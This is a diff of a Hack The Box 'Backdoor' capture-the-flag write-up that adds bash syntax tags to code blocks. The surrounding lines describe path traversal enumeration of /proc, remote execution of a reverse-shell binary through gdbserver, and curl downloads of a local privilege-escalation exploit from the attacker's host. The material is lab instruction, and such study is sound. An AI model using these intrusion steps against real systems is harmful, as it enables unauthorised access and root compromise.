@@ -5,7 +5,7 @@ This box prooved to be quite intresting, it teaches you different techniques whi
 First I start with a nmap scan. It doesn't revewal anything out of the usual, I find three ports, 22, 80 and 1337.
 I'm a little unsure what I can use the 1337 port for yet so i try to connect and see if I get any errors.
 ## <! -- > INSERT NMAP SCAN RESULTS
-```
+```bash
 nc -nv 10.10.11.143 1337
 CONNECTED
 ls
@@ -15,7 +15,7 @@ whoami
 Ok, so the port is open and I can connect, but it isn't giving me any feedback. So I'll let that be for now.
 Next I add backdoor.htb as an alias to 10.10.11.143 just to make sure there isn't any virtual routing that is happening so I can detect that too. As my previous writeups say, you do that by adding the ip and alias to `/etc/hosts`. After that I start a dirb scan to check out the results.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Documents/HTB/Backdoor]                                
 └─$ dirb http://backdoor.htb                                                    
 -----------------                                                      
@@ -73,7 +73,7 @@ So the enumeration of processes has to be done by either doing `cat /proc/$pid/c
 
 So on to the script.
 The script first checks how many PID there is, and after that it manually bruteforce cats every number from 0 - Max number of PID. This proves one problem, if it gets a NULL match, the webpage will still send an empty string that looks like this `!!!<----- ADD EMPTY SCRIPT LINE HERE>`. Therefore you need to add that filter to sanitize your output.
-```
+```bash
 PID: 809        ../../../../../../../proc/809/cmdline../../../../../../../proc/809/cmdline../../../../../../../proc/809/cmdline/bin/sh while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done <script>win
 dow.close()</script>                                                                                                                                                                                                                        
 PID: 815        ../../../../../../../proc/815/cmdline../../../../../../../proc/815/cmdline../../../../../../../proc/815/cmdline/bin/sh while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done <script>wind$
@@ -100,7 +100,7 @@ set remote exec-file /home/user/plsRunMe.elf
 # Execute reverse shell executable
 run
 ```
-```
+```bash
 (gdb) target extended-remote 10.10.11.125:1337
 `target:/home/user/plsRunMe.elf' has disappeared; keeping its symbols.
 Remote debugging using 10.10.11.125:1337
@@ -175,7 +175,7 @@ So googling the cve gave me a code from this github page: https://www.exploit-db
 
 It had three files, evil-so.c, exploit.c and makefile. Just transfer the three and you're good to go.
 
-```
+```bash
 $ curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c
 curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -196,7 +196,7 @@ make
 /bin/sh: 15: make: not found
 ```
 Seriously? Make isn't installed, ohh well, lets just transfer the finished product. So I make it on my kali client and just transfer it.
-```
+```bash
 $ curl http://10.10.14.231:8000/exploit -o exploit
 curl http://10.10.14.231:8000/exploit -o exploit
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
